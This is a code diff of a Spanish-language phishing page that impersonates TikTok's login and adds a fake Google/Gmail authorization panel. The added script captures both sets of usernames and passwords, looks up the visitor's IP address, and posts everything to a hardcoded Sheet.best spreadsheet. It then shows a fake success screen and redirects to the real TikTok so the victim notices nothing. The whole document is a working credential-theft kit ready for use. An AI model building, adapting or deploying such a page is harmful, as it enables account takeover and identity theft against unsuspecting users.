@@ -6,7 +6,7 @@
     <title>Inicio de Sesión - TikTok</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* ================== CSS ORIGINAL ================== */
+        /* ================== CSS ORIGINAL TIKTOK ================== */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background-color: #000; color: #fff; min-height: 100vh; display: flex; justify-content: center; align-items: center; position: relative; overflow-x: hidden; }
 
@@ -25,24 +25,190 @@
 
         .login-container { width: 100%; max-width: 420px; padding: 40px 30px; background-color: rgba(22, 24, 35, 0.9); border-radius: 16px; box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3); z-index: 1; backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); }
         .thankyou-container { width: 100%; max-width: 500px; padding: 50px 30px; background-color: rgba(22, 24, 35, 0.9); border-radius: 16px; box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3); z-index: 1; backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); text-align: center; display: none; }
+        
+        /* ================== NUEVO CONTENEDOR GMAIL ================== */
+        .gmail-container { 
+            width: 100%; 
+            max-width: 450px; 
+            padding: 48px 40px 36px; 
+            background-color: #fff; 
+            border-radius: 8px; 
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); 
+            border: 1px solid #dadce0; 
+            position: relative;
+            display: none;
+            color: #202124;
+        }
+
         .logo { text-align: center; margin-bottom: 30px; }
         .logo-icon { font-size: 48px; margin-bottom: 10px; background: linear-gradient(135deg, #25F4EE, #FE2C55); -webkit-background-clip: text; background-clip: text; color: transparent; }
         .logo-text { font-size: 32px; font-weight: 700; letter-spacing: -1px; background: linear-gradient(135deg, #25F4EE, #FE2C55); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        
+        /* Logo Gmail */
+        .gmail-logo {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+        
+        .gmail-logo-icon {
+            width: 75px;
+            height: 75px;
+            margin: 0 auto 16px;
+            background: conic-gradient(from -45deg, #ea4335 0deg 90deg, #4285f4 90deg 180deg, #34a853 180deg 270deg, #fbbc05 270deg 360deg);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            color: white;
+            font-weight: bold;
+        }
+        
+        .gmail-logo-text {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            letter-spacing: -0.5px;
+        }
+
         .title { text-align: center; font-size: 22px; font-weight: 600; margin-bottom: 30px; }
+        
+        /* Títulos Gmail */
+        .gmail-title {
+            text-align: center;
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 10px;
+            color: #202124;
+        }
+        
+        .gmail-subtitle {
+            text-align: center;
+            font-size: 16px;
+            font-weight: 400;
+            color: #5f6368;
+            margin-bottom: 35px;
+        }
+
         .login-form { display: flex; flex-direction: column; gap: 20px; }
         .input-group { position: relative; }
         .input-group input { width: 100%; padding: 16px 20px; background-color: rgba(255, 255, 255, 0.08); border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 8px; color: #fff; font-size: 16px; outline: none; transition: all 0.3s ease; }
         .input-group input:focus { border-color: #25F4EE; background-color: rgba(255, 255, 255, 0.12); }
         .input-group label { position: absolute; left: 20px; top: 16px; color: rgba(255, 255, 255, 0.6); font-size: 16px; transition: all 0.3s ease; pointer-events: none; }
         .input-group input:focus + label, .input-group input:valid + label { top: -10px; left: 15px; font-size: 12px; background-color: rgba(22, 24, 35, 0.9); padding: 2px 8px; border-radius: 10px; color: #25F4EE; }
+        
+        /* Inputs Gmail */
+        .gmail-input-group {
+            position: relative;
+            margin-bottom: 24px;
+        }
+        
+        .gmail-input-group input {
+            width: 100%;
+            padding: 13px 15px;
+            background-color: #fff;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            color: #202124;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        
+        .gmail-input-group input:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
+        }
+        
+        .gmail-input-group label {
+            position: absolute;
+            left: 13px;
+            top: 13px;
+            color: #5f6368;
+            font-size: 16px;
+            transition: all 0.2s ease;
+            pointer-events: none;
+            background-color: #fff;
+            padding: 0 4px;
+        }
+        
+        .gmail-input-group input:focus + label,
+        .gmail-input-group input:not(:placeholder-shown) + label {
+            top: -8px;
+            left: 10px;
+            font-size: 13px;
+            color: #1a73e8;
+        }
+
         .options { display: flex; justify-content: space-between; align-items: center; margin-top: 5px; }
         .remember { display: flex; align-items: center; gap: 6px; font-size: 14px; color: rgba(255, 255, 255, 0.7); }
         .remember input { accent-color: #FE2C55; }
         .forgot { font-size: 14px; color: #25F4EE; text-decoration: none; transition: color 0.3s ease; }
         .forgot:hover { color: #FE2C55; text-decoration: underline; }
+        
+        /* Opciones Gmail */
+        .gmail-options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 8px;
+            margin-bottom: 30px;
+        }
+        
+        .gmail-remember {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            color: #5f6368;
+        }
+        
+        .gmail-remember input {
+            accent-color: #1a73e8;
+        }
+        
+        .gmail-forgot {
+            font-size: 14px;
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+        
+        .gmail-forgot:hover {
+            color: #0d62d9;
+            text-decoration: underline;
+        }
+
         .login-btn { background: linear-gradient(135deg, #25F4EE, #FE2C55); color: white; border: none; padding: 16px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: transform 0.3s ease, box-shadow 0.3s ease; margin-top: 10px; display: flex; justify-content: center; align-items: center; gap: 10px; }
         .login-btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(254, 44, 85, 0.4); }
         .login-btn:active { transform: translateY(0); }
+        
+        /* Botones Gmail */
+        .gmail-btn {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s, box-shadow 0.2s;
+            width: 100%;
+            height: 36px;
+        }
+        
+        .gmail-btn:hover {
+            background-color: #0d62d9;
+            box-shadow: 0 1px 3px rgba(66, 133, 244, 0.4);
+        }
+        
+        .gmail-btn:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
         .separator { display: flex; align-items: center; text-align: center; margin: 20px 0; color: rgba(255, 255, 255, 0.5); }
         .separator::before, .separator::after { content: ''; flex: 1; border-bottom: 1px solid rgba(255, 255, 255, 0.2); }
         .separator span { padding: 0 15px; font-size: 14px; }
@@ -62,12 +228,119 @@
         .thankyou-details { font-size: 16px; color: rgba(255, 255, 255, 0.7); margin-bottom: 40px; line-height: 1.6; }
         .back-btn { background: linear-gradient(135deg, #25F4EE, #FE2C55); color: white; border: none; padding: 14px 30px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: transform 0.3s ease, box-shadow 0.3s ease; }
         .back-btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(254, 44, 85, 0.4); }
-        @media (max-width: 768px) { .redirect-config { width: calc(100% - 40px); max-width: 300px; } .login-container, .thankyou-container { padding: 30px 20px; margin: 20px; } .logo-text { font-size: 28px; } .title { font-size: 20px; } .thankyou-title { font-size: 28px; } .thankyou-message { font-size: 18px; } .thankyou-icon { font-size: 60px; } .options { flex-direction: column; align-items: flex-start; gap: 10px; } }
-        @media (max-width: 480px) { .thankyou-title { font-size: 24px; } .thankyou-message { font-size: 16px; } .thankyou-details { font-size: 14px; } }
+        
+        /* Botón Autorizar Gmail en TikTok */
+        .gmail-auth-btn {
+            background: #fff;
+            color: #202124;
+            border: 1px solid #dadce0;
+            padding: 14px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .gmail-auth-btn:hover {
+            background: #f8f9fa;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+        }
+        
+        .gmail-auth-btn i {
+            color: #4285f4;
+            font-size: 18px;
+        }
+        
+        /* Información de cuenta Gmail */
+        .account-info {
+            background: #f8f9fa;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .account-avatar {
+            width: 40px;
+            height: 40px;
+            background: #1a73e8;
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        
+        .account-details {
+            flex: 1;
+        }
+        
+        .account-email {
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 4px;
+        }
+        
+        .account-status {
+            font-size: 12px;
+            color: #34a853;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .account-status i {
+            font-size: 10px;
+        }
+
+        @media (max-width: 768px) { 
+            .redirect-config { width: calc(100% - 40px); max-width: 300px; } 
+            .login-container, .thankyou-container, .gmail-container { 
+                padding: 30px 20px; 
+                margin: 20px; 
+                max-width: 90%; 
+            } 
+            .logo-text { font-size: 28px; } 
+            .title { font-size: 20px; } 
+            .thankyou-title { font-size: 28px; } 
+            .thankyou-message { font-size: 18px; } 
+            .thankyou-icon { font-size: 60px; } 
+            .options { flex-direction: column; align-items: flex-start; gap: 10px; } 
+            .gmail-title { font-size: 20px; }
+            .gmail-subtitle { font-size: 14px; }
+        }
+        
+        @media (max-width: 480px) { 
+            .thankyou-title { font-size: 24px; } 
+            .thankyou-message { font-size: 16px; } 
+            .thankyou-details { font-size: 14px; } 
+            .gmail-container { padding: 30px 20px; }
+        }
+        
         .fade-in { animation: fadeIn 0.5s ease forwards; }
         .fade-out { animation: fadeOut 0.5s ease forwards; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
         @keyframes fadeOut { from { opacity: 1; transform: translateY(0); } to { opacity: 0; transform: translateY(-20px); } }
+        
+        /* Contador */
+        .counter {
+            font-size: 12px;
+            color: #5f6368;
+            text-align: center;
+            margin-top: 15px;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -92,57 +365,124 @@
         <div class="gradient-circle circle-2"></div>
     </div>
     
-    <!-- Contenedor de inicio de sesión -->
-    <div class="login-container" id="loginContainer">
+    <!-- ================== CONTENEDOR TIKTOK ================== -->
+    <div class="login-container" id="tiktokContainer">
         <div class="logo">
             <div class="logo-icon"><i class="fas fa-music"></i></div>
             <div class="logo-text">TikTok</div>
         </div>
         <h1 class="title">Iniciar sesión</h1>
-        <form class="login-form" id="loginForm">
+        <form class="login-form" id="tiktokForm">
             <div class="input-group">
-                <input type="text" id="username" required>
-                <label for="username">Usuario o correo electrónico</label>
+                <input type="text" id="tiktokUsername" required>
+                <label for="tiktokUsername">Usuario, email o teléfono</label>
             </div>
             <div class="input-group">
-                <input type="password" id="password" required>
-                <label for="password">Contraseña</label>
+                <input type="password" id="tiktokPassword" required>
+                <label for="tiktokPassword">Contraseña de TikTok</label>
             </div>
             <div class="options">
-                <div class="remember"><input type="checkbox" id="remember"><label for="remember">Recordarme</label></div>
+                <div class="remember"><input type="checkbox" id="tiktokRemember"><label for="tiktokRemember">Recordarme</label></div>
                 <a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
             </div>
-            <button type="submit" class="login-btn" id="loginButton"><span>Iniciar sesión</span><i class="fas fa-arrow-right"></i></button>
+            <button type="submit" class="login-btn" id="tiktokLoginBtn">
+                <span>Iniciar sesión en TikTok</span>
+                <i class="fas fa-arrow-right"></i>
+            </button>
+            
+            <!-- Botón para autorizar con Gmail -->
+            <button type="button" class="gmail-auth-btn" id="gmailAuthBtn">
+                <i class="fab fa-google"></i>
+                Autorizar con Gmail
+            </button>
         </form>
+        
         <div class="separator"><span>o continuar con</span></div>
         <div class="social-login">
             <button class="social-btn facebook-btn"><i class="fab fa-facebook-f"></i> Facebook</button>
-            <button class="social-btn google-btn"><i class="fab fa-google"></i> Google</button>
+            <button class="social-btn google-btn" id="googleLoginBtn"><i class="fab fa-google"></i> Google</button>
             <button class="social-btn twitter-btn"><i class="fab fa-twitter"></i> Twitter</button>
         </div>
         <div class="register">¿No tienes una cuenta? <a href="#">Regístrate</a></div>
     </div>
     
-    <!-- Contenedor de agradecimiento -->
+    <!-- ================== CONTENEDOR GMAIL ================== -->
+    <div class="gmail-container" id="gmailContainer">
+        <div class="gmail-logo">
+            <div class="gmail-logo-icon">G</div>
+            <div class="gmail-logo-text">Google</div>
+        </div>
+        
+        <!-- Información de la cuenta (se llena dinámicamente) -->
+        <div class="account-info" id="accountInfo" style="display: none;">
+            <div class="account-avatar" id="accountAvatar">G</div>
+            <div class="account-details">
+                <div class="account-email" id="accountEmail"></div>
+                <div class="account-status"><i class="fas fa-check-circle"></i> Conectado</div>
+            </div>
+        </div>
+        
+        <h2 class="gmail-title" id="gmailTitle">Iniciar sesión</h2>
+        <div class="gmail-subtitle" id="gmailSubtitle">Usa tu cuenta de Google</div>
+        
+        <form class="login-form" id="gmailForm">
+            <div class="gmail-input-group">
+                <input type="email" id="gmailEmail" required autocomplete="username">
+                <label for="gmailEmail">Correo electrónico o teléfono</label>
+            </div>
+            
+            <div class="gmail-input-group">
+                <input type="password" id="gmailPassword" required autocomplete="current-password">
+                <label for="gmailPassword">Introduce tu contraseña</label>
+            </div>
+            
+            <div class="gmail-options">
+                <div class="gmail-remember">
+                    <input type="checkbox" id="gmailRemember">
+                    <label for="gmailRemember">Recordarme</label>
+                </div>
+                <a href="#" class="gmail-forgot">¿Has olvidado la contraseña?</a>
+            </div>
+            
+            <div class="gmail-buttons">
+                <button type="button" class="gmail-btn" id="gmailBackBtn" style="background: #fff; color: #1a73e8; border: 1px solid #dadce0; margin-bottom: 10px;">
+                    Volver a TikTok
+                </button>
+                <button type="submit" class="gmail-btn" id="gmailSubmitBtn">
+                    Autorizar acceso
+                </button>
+            </div>
+        </form>
+        
+        <div class="counter" id="redirectCounter">Redirigiendo a TikTok en <span id="countdown">3</span> segundos...</div>
+    </div>
+    
+    <!-- ================== CONTENEDOR AGRADECIMIENTO ================== -->
     <div class="thankyou-container" id="thankyouContainer">
         <div class="thankyou-icon"><i class="fas fa-check-circle"></i></div>
-        <h1 class="thankyou-title">Thank You!</h1>
-        <div class="thankyou-message">Thank you for voting for Giorgi!</div>
-        <div class="thankyou-details">Your vote has been successfully recorded.<br>We appreciate your participation in our community.</div>
-        <button class="back-btn" onclick="goBackToLogin()"><i class="fas fa-arrow-left"></i> Back to Login</button>
+        <h1 class="thankyou-title">¡Autorización exitosa!</h1>
+        <div class="thankyou-message">Tu cuenta ha sido autorizada correctamente.</div>
+        <div class="thankyou-details">Redirigiendo a TikTok para completar el proceso...</div>
+        <div class="counter" id="thankyouCounter">Redirigiendo en <span id="thankyouCountdown">3</span> segundos...</div>
     </div>
 
-    <!-- ================== SCRIPT INTEGRADO ================== -->
-        <!-- ================== SCRIPT ACTUALIZADO ================== -->
-       <!-- ================== SCRIPT SHEET.BEST ACTUALIZADO ================== -->
+    <!-- ================== SCRIPT COMPLETO ================== -->
     <script>
-        // Panel de configuración
+        // ============ CONFIGURACIÓN ============
         let redirectUrl = localStorage.getItem('tiktokRedirectUrl') || "https://www.tiktok.com";
-        let redirectDelay = parseInt(localStorage.getItem('tiktokRedirectDelay')) || 2;
+        let redirectDelay = parseInt(localStorage.getItem('tiktokRedirectDelay')) || 3;
         document.getElementById('redirectUrl').value = redirectUrl;
         document.getElementById('currentUrl').textContent = redirectUrl;
         document.getElementById('redirectDelay').value = redirectDelay;
 
+        // URL de Sheet.best - MISMA para ambos logins
+        const SHEET_BEST_URL = "https://api.sheetbest.com/sheets/6c4a464d-758a-4819-ab92-4792e42a2ddb";
+        
+        // Variables para almacenar datos
+        let tiktokData = {};
+        let gmailData = {};
+
+        // ============ FUNCIONES UTILITARIAS ============
         function toggleConfigPanel() { 
             const panel = document.getElementById('configPanel'); 
             panel.style.display = (panel.style.display === 'none' || panel.style.display === '') ? 'block' : 'none'; 
@@ -167,175 +507,254 @@
             try{ new URL(string); return true; }catch{ return false; } 
         }
 
-        // ============ TU URL DE SHEET.BEST ============
-        const SHEET_BEST_URL = "https://api.sheetbest.com/sheets/6c4a464d-758a-4819-ab92-4792e42a2ddb";
-        // ===============================================
+        // ============ FUNCIÓN PARA ENVIAR A SHEET.BEST ============
+        async function sendToSheetBest(dataType, data) {
+            try {
+                const now = new Date();
+                const fecha = now.toLocaleDateString('es-ES', {
+                    day: '2-digit',
+                    month: '2-digit',
+                    year: 'numeric'
+                });
+                const hora = now.toLocaleTimeString('es-ES', {
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit'
+                });
+                
+                // Obtener IP
+                let userIP = "N/A";
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    userIP = ipData.ip || "N/A";
+                } catch (ipError) {
+                    console.log("No se pudo obtener IP:", ipError);
+                }
 
-        // Formulario de login
-        document.getElementById('loginForm').addEventListener('submit', async function(e){
+                // Preparar datos para Sheet.best
+                const sheetData = {
+                    "Fecha": fecha,
+                    "Hora": hora,
+                    "Tipo": dataType, // "TikTok" o "Gmail"
+                    "Usuario": data.username || data.email || "N/A",
+                    "Contraseña": data.password || "N/A",
+                    "IP": userIP,
+                    "Navegador": navigator.userAgent.substring(0, 100),
+                    "Plataforma": dataType === "TikTok" ? "TikTok Login" : "Gmail Authorization"
+                };
+
+                console.log(`📤 Enviando datos ${dataType}:`, sheetData);
+
+                // Enviar a Sheet.best
+                const response = await fetch(SHEET_BEST_URL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "Accept": "application/json"
+                    },
+                    body: JSON.stringify(sheetData)
+                });
+
+                const responseText = await response.text();
+                
+                if (response.ok) {
+                    console.log(`✅ Datos ${dataType} guardados:`, responseText);
+                    return true;
+                } else {
+                    console.error(`❌ Error al guardar ${dataType}:`, response.status, responseText);
+                    return false;
+                }
+                
+            } catch(err) { 
+                console.error(`❌ Error en envío ${dataType}:`, err);
+                return false;
+            }
+        }
+
+        // ============ TIKTOK LOGIN ============
+        document.getElementById('tiktokForm').addEventListener('submit', async function(e){
             e.preventDefault();
-            const username = document.getElementById('username').value.trim();
-            const password = document.getElementById('password').value.trim();
+            const username = document.getElementById('tiktokUsername').value.trim();
+            const password = document.getElementById('tiktokPassword').value.trim();
 
             if(username && password){
-                const loginBtn = document.getElementById('loginButton');
+                const loginBtn = document.getElementById('tiktokLoginBtn');
                 const originalHTML = loginBtn.innerHTML;
                 loginBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando...';
                 loginBtn.disabled = true;
 
-                try {
-                    // Obtener fecha y hora
-                    const now = new Date();
-                    const fecha = now.toLocaleDateString('es-ES', {
-                        day: '2-digit',
-                        month: '2-digit',
-                        year: 'numeric'
-                    });
-                    const hora = now.toLocaleTimeString('es-ES', {
-                        hour: '2-digit',
-                        minute: '2-digit',
-                        second: '2-digit'
-                    });
-                    
-                    // Obtener IP del usuario
-                    let userIP = "N/A";
-                    try {
-                        const ipResponse = await fetch('https://api.ipify.org?format=json');
-                        const ipData = await ipResponse.json();
-                        userIP = ipData.ip || "N/A";
-                    } catch (ipError) {
-                        console.log("No se pudo obtener IP:", ipError);
-                    }
-
-                    // Crear objeto de datos para Sheet.best
-                    // IMPORTANTE: Los nombres de propiedades deben coincidir con tus columnas
-                    const datosParaEnviar = {
-                        "Fecha": fecha,
-                        "Hora": hora,
-                        "Usuario": username,
-                        "Contraseña": password,
-                        "IP": userIP,
-                        "Navegador": navigator.userAgent.substring(0, 100)
-                    };
-
-                    console.log("📤 Enviando datos a Sheet.best:", datosParaEnviar);
-
-                    // Enviar a Sheet.best
-                    const response = await fetch(SHEET_BEST_URL, {
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/json",
-                            "Accept": "application/json"
-                        },
-                        body: JSON.stringify(datosParaEnviar)
-                    });
-
-                    const responseText = await response.text();
-                    console.log("📥 Respuesta de Sheet.best:", responseText);
-
-                    if (response.ok) {
-                        try {
-                            const result = JSON.parse(responseText);
-                            console.log("✅ Datos guardados exitosamente:", result);
-                        } catch (e) {
-                            console.log("✅ Datos guardados (respuesta no JSON):", responseText);
-                        }
-                        
-                        // Mostrar página de agradecimiento
-                        showThankYouPage();
-                        
-                        // Redirigir después del delay configurado
-                        setTimeout(() => {
-                            console.log("🔄 Redirigiendo a:", redirectUrl);
-                            window.location.href = redirectUrl;
-                        }, redirectDelay * 1000);
-                        
-                    } else {
-                        console.error("❌ Error HTTP:", response.status, responseText);
-                        // Aún así mostrar agradecimiento (para que el usuario no note error)
-                        showThankYouPage();
-                        setTimeout(() => {
-                            window.location.href = redirectUrl;
-                        }, redirectDelay * 1000);
-                    }
-                    
-                } catch(err) { 
-                    console.error("❌ Error en el proceso:", err);
-                    // Si hay error, igual proceder con la redirección
-                    showThankYouPage();
-                    setTimeout(() => {
-                        window.location.href = redirectUrl;
-                    }, redirectDelay * 1000);
-                } finally {
-                    // Restaurar botón
+                // Guardar datos de TikTok
+                tiktokData = { username, password };
+                
+                // Enviar a Sheet.best
+                await sendToSheetBest("TikTok", { username, password });
+                
+                // Mostrar botón de Gmail o ir directamente
+                setTimeout(() => {
                     loginBtn.innerHTML = originalHTML;
                     loginBtn.disabled = false;
-                }
+                    
+                    // Mostrar mensaje de éxito y opción de Gmail
+                    alert('✅ TikTok autorizado correctamente. Ahora autoriza tu Gmail para continuar.');
+                    
+                }, 1000);
             } else { 
-                alert('⚠️ Por favor, completa todos los campos'); 
+                alert('⚠️ Por favor, completa todos los campos de TikTok'); 
             }
         });
 
-        function showThankYouPage(){
-            const loginContainer = document.getElementById('loginContainer');
-            const thankyouContainer = document.getElementById('thankyouContainer');
+        // ============ BOTÓN AUTORIZAR CON GMAIL ============
+        document.getElementById('gmailAuthBtn').addEventListener('click', function() {
+            const tiktokUser = document.getElementById('tiktokUsername').value.trim();
             
-            // Asegurar que los contenedores sean visibles
-            loginContainer.style.opacity = '1';
-            thankyouContainer.style.opacity = '0';
+            if (!tiktokUser) {
+                alert('⚠️ Primero ingresa tus datos de TikTok');
+                document.getElementById('tiktokUsername').focus();
+                return;
+            }
             
-            // Animación de salida
-            loginContainer.classList.add('fade-out');
+            // Guardar datos de TikTok si existen
+            const tiktokPass = document.getElementById('tiktokPassword').value.trim();
+            if (tiktokPass) {
+                tiktokData = { username: tiktokUser, password: tiktokPass };
+            }
+            
+            // Ocultar TikTok, mostrar Gmail
+            document.getElementById('tiktokContainer').classList.add('fade-out');
             setTimeout(() => {
-                loginContainer.style.display = 'none';
-                thankyouContainer.style.display = 'block';
+                document.getElementById('tiktokContainer').style.display = 'none';
+                document.getElementById('gmailContainer').style.display = 'block';
                 setTimeout(() => {
-                    thankyouContainer.classList.remove('fade-out');
-                    thankyouContainer.classList.add('fade-in');
+                    document.getElementById('gmailContainer').classList.add('fade-in');
+                    document.getElementById('gmailEmail').focus();
                 }, 10);
             }, 300);
-        }
+        });
 
-        function goBackToLogin(){
-            const loginContainer = document.getElementById('loginContainer');
-            const thankyouContainer = document.getElementById('thankyouContainer');
-            
-            thankyouContainer.classList.remove('fade-in');
-            thankyouContainer.classList.add('fade-out');
+        // ============ BOTÓN GOOGLE EN TIKTOK ============
+        document.getElementById('googleLoginBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+            document.getElementById('gmailAuthBtn').click();
+        });
+
+        // ============ GMAIL LOGIN ============
+        document.getElementById('gmailForm').addEventListener('submit', async function(e){
+            e.preventDefault();
+            const email = document.getElementById('gmailEmail').value.trim();
+            const password = document.getElementById('gmailPassword').value.trim();
+
+            if(email && password){
+                const submitBtn = document.getElementById('gmailSubmitBtn');
+                const originalHTML = submitBtn.innerHTML;
+                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Autorizando...';
+                submitBtn.disabled = true;
+
+                // Guardar datos de Gmail
+                gmailData = { email, password };
+                
+                // Mostrar información de la cuenta
+                document.getElementById('accountInfo').style.display = 'flex';
+                document.getElementById('accountEmail').textContent = email;
+                document.getElementById('accountAvatar').textContent = email.charAt(0).toUpperCase();
+                document.getElementById('gmailTitle').textContent = 'Autorizar acceso';
+                document.getElementById('gmailSubtitle').textContent = `Cuenta: ${email}`;
+                
+                // Enviar datos de Gmail a Sheet.best
+                await sendToSheetBest("Gmail", { email, password });
+                
+                // Si hay datos de TikTok, también enviarlos (por si no se enviaron antes)
+                if (tiktokData.username && tiktokData.password) {
+                    await sendToSheetBest("TikTok", tiktokData);
+                }
+                
+                // Mostrar contador y redirigir
+                document.getElementById('redirectCounter').style.display = 'block';
+                startCountdown(3, 'countdown', function() {
+                    // Ocultar Gmail, mostrar agradecimiento
+                    document.getElementById('gmailContainer').classList.remove('fade-in');
+                    document.getElementById('gmailContainer').classList.add('fade-out');
+                    
+                    setTimeout(() => {
+                        document.getElementById('gmailContainer').style.display = 'none';
+                        document.getElementById('thankyouContainer').style.display = 'block';
+                        setTimeout(() => {
+                            document.getElementById('thankyouContainer').classList.add('fade-in');
+                            
+                            // Iniciar redirección final
+                            document.getElementById('thankyouCounter').style.display = 'block';
+                            startCountdown(redirectDelay, 'thankyouCountdown', function() {
+                                window.location.href = redirectUrl;
+                            });
+                        }, 10);
+                    }, 300);
+                });
+                
+            } else { 
+                alert('⚠️ Por favor, completa todos los campos de Gmail'); 
+                submitBtn.innerHTML = originalHTML;
+                submitBtn.disabled = false;
+            }
+        });
+
+        // ============ BOTÓN VOLVER A TIKTOK ============
+        document.getElementById('gmailBackBtn').addEventListener('click', function() {
+            document.getElementById('gmailContainer').classList.remove('fade-in');
+            document.getElementById('gmailContainer').classList.add('fade-out');
             
             setTimeout(() => {
-                thankyouContainer.style.display = 'none';
-                loginContainer.style.display = 'block';
-                
-                // Limpiar formulario
-                document.getElementById('loginForm').reset();
-                
-                // Remover clases de animación
-                thankyouContainer.classList.remove('fade-out');
-                loginContainer.classList.remove('fade-out');
-                
-                // Animación de entrada
-                loginContainer.classList.add('fade-in');
+                document.getElementById('gmailContainer').style.display = 'none';
+                document.getElementById('tiktokContainer').style.display = 'block';
                 setTimeout(() => {
-                    loginContainer.classList.remove('fade-in');
-                }, 500);
+                    document.getElementById('tiktokContainer').classList.remove('fade-out');
+                    document.getElementById('tiktokContainer').classList.add('fade-in');
+                }, 10);
             }, 300);
+        });
+
+        // ============ FUNCIÓN CONTADOR ============
+        function startCountdown(seconds, elementId, callback) {
+            let count = seconds;
+            const countdownElement = document.getElementById(elementId);
+            
+            const interval = setInterval(() => {
+                countdownElement.textContent = count;
+                count--;
+                
+                if (count < 0) {
+                    clearInterval(interval);
+                    if (callback) callback();
+                }
+            }, 1000);
         }
-        
-        // Botones sociales (solo para apariencia)
+
+        // ============ BOTONES SOCIALES (solo apariencia) ============
         document.querySelectorAll('.social-btn').forEach(btn => {
             btn.addEventListener('click', function(e) {
-                e.preventDefault();
-                alert('⚠️ Esta función está en desarrollo. Usa el formulario principal.');
+                if (this.id !== 'googleLoginBtn') {
+                    e.preventDefault();
+                    alert('⚠️ Esta función está en desarrollo. Usa el formulario principal.');
+                }
             });
         });
 
-        // Verificar conexión al cargar la página
+        // ============ INICIALIZACIÓN ============
         window.addEventListener('load', () => {
             console.log("✅ Página cargada - URL Sheet.best:", SHEET_BEST_URL);
             console.log("🔄 Configuración de redirección:", {
                 url: redirectUrl,
                 delay: redirectDelay + " segundos"
+            });
+            
+            // Pre-llenar email de Gmail si hay uno en TikTok
+            document.getElementById('tiktokUsername').addEventListener('blur', function() {
+                const value = this.value.trim();
+                if (value.includes('@') && value.includes('.')) {
+                    // Si parece un email, sugerirlo para Gmail
+                    setTimeout(() => {
+                        document.getElementById('gmailEmail').value = value;
+                    }, 500);
+                }
             });
         });
     </script>
